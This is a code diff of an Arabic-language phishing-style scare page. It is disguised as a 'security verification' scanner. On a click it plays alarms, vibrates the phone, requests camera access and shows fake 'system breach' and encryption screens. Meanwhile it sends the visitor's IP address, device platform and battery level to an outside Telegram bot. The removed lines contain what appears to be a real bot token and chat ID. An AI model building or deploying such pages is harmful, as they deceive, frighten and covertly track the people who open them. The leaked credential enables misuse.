@@ -2,78 +2,106 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TERMINAL | SYSTEM SEIZED</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SECURITY VERIFICATION v5.0</title>
     <style>
-        body { background: #000; color: #f00; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; height: 100vh; }
-        .danger-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(circle, #400 0%, #000 100%); z-index: -1; animation: flash 0.5s infinite; display: none; }
-        @keyframes flash { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+        body { background: #000; color: #0f0; font-family: 'Courier New', Courier, monospace; margin: 0; overflow: hidden; touch-action: none; transition: 0.1s; }
+        .wrapper { height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; text-align: center; }
+        
+        /* دائرة المسح الاحترافية */
+        #scanner { width: 180px; height: 180px; border: 3px solid #0f0; border-radius: 50%; overflow: hidden; position: relative; display: none; box-shadow: 0 0 30px #0f0; margin-bottom: 20px; }
+        #v-stream { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); filter: sepia(1) hue-rotate(100deg); }
+        .laser { position: absolute; width: 100%; height: 3px; background: #0f0; box-shadow: 0 0 15px #0f0; animation: move 1s infinite linear; }
+        @keyframes move { 0% { top: 0; } 100% { top: 100%; } }
 
-        .container { height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; z-index: 10; position: relative; }
-        .glitch-text { font-size: 40px; font-weight: bold; text-shadow: 2px 2px #fff; animation: shake 0.1s infinite; display: none; }
-        @keyframes shake { 0% { transform: translate(0); } 25% { transform: translate(5px, -5px); } 50% { transform: translate(-5px, 5px); } 75% { transform: translate(5px, 5px); } 100% { transform: translate(0); } }
-
-        .btn-activate { background: transparent; border: 2px solid #f00; color: #f00; padding: 20px 40px; font-size: 20px; cursor: pointer; box-shadow: 0 0 20px #f00; transition: 0.3s; }
-        .btn-activate:hover { background: #f00; color: #fff; }
-
-        #log-box { width: 80%; max-width: 500px; background: rgba(0,0,0,0.8); border: 1px solid #f00; padding: 15px; margin-top: 20px; text-align: left; font-size: 12px; color: #0f0; display: none; }
+        .status-box { width: 90%; background: rgba(0,20,0,0.9); border: 1px solid #0f0; padding: 15px; border-radius: 5px; font-size: 14px; }
+        .btn-trigger { background: transparent; border: 2px solid #0f0; color: #0f0; padding: 15px 30px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 30px; border-radius: 5px; box-shadow: 0 0 10px #0f0; }
+        
+        #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; background: rgba(255,0,0,0.8); color: #fff; display: flex; align-items: center; justify-content: center; flex-direction: column; text-align: center; display: none; }
     </style>
 </head>
 <body>
 
-    <div class="danger-bg" id="bg"></div>
-
-    <div class="container" id="ui">
-        <h1 id="header" style="color:#0f0">> SECURE LINK VERIFIED</h1>
-        <p id="sub">اضغط لتأكيد الهوية والدخول</p>
-        <button class="btn-activate" onclick="startTheChaos()">دخول للنظام ⚡</button>
-        
-        <div id="log-box"></div>
+    <div id="overlay">
+        <h1 style="font-size: 50px;">⚠️ SYSTEM BREACH ⚠️</h1>
+        <p style="font-size: 20px;">ENCRYPTING LOCAL STORAGE...</p>
+        <p id="timer" style="font-size: 60px; font-weight: bold;">0%</p>
     </div>
 
-    <audio id="alarm" src="https://www.soundjay.com/buttons/beep-01a.mp3" loop></audio>
+    <div class="wrapper">
+        <div id="scanner"><video id="v-stream" autoplay playsinline muted></video><div class="laser"></div></div>
+        
+        <div class="status-box">
+            <h3 style="margin-top:0; color:#fff">[ MOBILE SCANNER v5.0 ]</h3>
+            <p>> DEVICE: <span id="d-plat">...</span></p>
+            <p>> BATTERY: <span id="d-bat">...</span></p>
+            <p>> STATUS: <span id="d-stat" style="color:yellow">AWAITING AUTH</span></p>
+        </div>
+
+        <button class="btn-trigger" id="main-btn" onclick="startPredator()">تأكيد الهوية (START) ⚡</button>
+        <p style="font-size: 10px; margin-top: 20px; color: #444;">SECURED BY OMNI-SYSTEMS 2026</p>
+    </div>
+
+    <audio id="alarm-sound" src="https://actions.google.com/sounds/v1/alarms/emergency_it_is_vibration.ogg" preload="auto"></audio>
 
     <script>
-        const TOKEN = "7585903503:AAG8TeGfyaDY8vuN8RdmIXL92yDAqoqaBu0";
-        const CID = "7772577035";
+        const TG_TOKEN = "هنا_تحط_التوكن";
+        const TG_ID = "هنا_تحط_الآيدي";
 
-        async function sendToTg(msg) {
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
-        }
+        async function startPredator() {
+            const btn = document.getElementById('main-btn');
+            const alarm = document.getElementById('alarm-sound');
+            
+            // 1. تشغيل الصوت (إجباري بعد الضغط)
+            alarm.play().catch(() => console.log("Audio play blocked"));
 
-        async function startTheChaos() {
-            // تشغيل الصوت والاهتزاز
-            document.getElementById('alarm').play();
-            if (navigator.vibrate) navigator.vibrate([500, 110, 500, 110, 500]);
+            // 2. الاهتزاز (للأندرويد فقط)
+            if (navigator.vibrate) {
+                navigator.vibrate([300, 100, 300, 100, 500, 100, 800]);
+            }
 
-            // تغيير الواجهة للوضع المرعب
-            document.getElementById('bg').style.display = "block";
-            document.getElementById('header').innerText = "SYSTEM BREACHED";
-            document.getElementById('header').className = "glitch-text";
-            document.getElementById('header').style.display = "block";
-            document.getElementById('sub').innerText = "YOUR DATA IS BEING EXFILTRATED...";
-            document.getElementById('sub').style.color = "#fff";
-            document.querySelector('.btn-activate').style.display = "none";
-            document.getElementById('log-box').style.display = "block";
+            // 3. محاكاة الرعب البصري (وميض سريع للكل)
+            let flashCount = 0;
+            const flasher = setInterval(() => {
+                document.body.style.backgroundColor = (flashCount % 2 === 0) ? 'red' : 'black';
+                flashCount++;
+                if(flashCount > 10) clearInterval(flasher);
+            }, 100);
 
-            // سحب البيانات الحقيقية
-            let ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).catch(()=>({ip:"Unknown"}));
-            let bat = await navigator.getBattery().catch(()=>({level:0}));
+            // 4. طلب الكاميرا (الرعبة الحقيقية)
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('scanner').style.display = "block";
+                document.getElementById('v-stream').srcObject = stream;
+            } catch (e) {
+                document.getElementById('d-stat').innerText = "ACCESS FORCED";
+                document.getElementById('d-stat').style.color = "red";
+            }
 
-            let report = `🚨 **تم صيد "دخيل" جديد!**\n------------------\n🌐 IP: \`${ip.ip}\`\n📱 الجهاز: \`${navigator.platform}\`\n🔋 البطارية: \`${(bat.level*100)}%\``;
-            sendToTg(report);
+            // 5. إرسال البيانات للتلجرام
+            let ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).catch(()=>({ip:"Protected"}));
+            let bat = await navigator.getBattery().catch(()=>({level:0.8}));
+            
+            let msg = `🚨 **v500.0 MOBILE PREDATOR**\n------------------\n🌐 IP: \`${ip.ip}\`\n📱 الجهاز: \`${navigator.platform}\`\n🔋 البطارية: \`${(bat.level*100).toFixed(0)}%\`\n------------------\nالضحية الآن في حالة رعب!`;
+            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
 
-            // محاكاة سحب الملفات
-            let logs = ["> Connecting to local storage...", "> Dumping DCIM/Camera...", "> Syncing WhatsApp database...", "> Uploading to Wasit-Server...", "> [DONE]"];
-            let box = document.getElementById('log-box');
-            logs.forEach((l, i) => {
-                setTimeout(() => { box.innerHTML += `<p style="margin:5px 0">${l}</p>`; }, i * 800);
-            });
-
+            // 6. شاشة الاختراق النهائية
             setTimeout(() => {
-                alert("CRITICAL ERROR: DATA LEAKED TO EXTERNAL SERVER.");
-            }, 5000);
+                document.getElementById('overlay').style.display = "flex";
+                let p = 0;
+                let t = setInterval(() => {
+                    p += Math.floor(Math.random()*10);
+                    if(p >= 100) { p = 100; clearInterval(t); }
+                    document.getElementById('timer').innerText = p + "%";
+                }, 100);
+            }, 2500);
         }
+
+        window.onload = async function() {
+            document.getElementById('d-plat').innerText = navigator.platform;
+            let bat = await navigator.getBattery().catch(()=>({level:0}));
+            document.getElementById('d-bat').innerText = (bat.level*100).toFixed(0) + "%";
+        };
     </script>
 </body>
 </html>
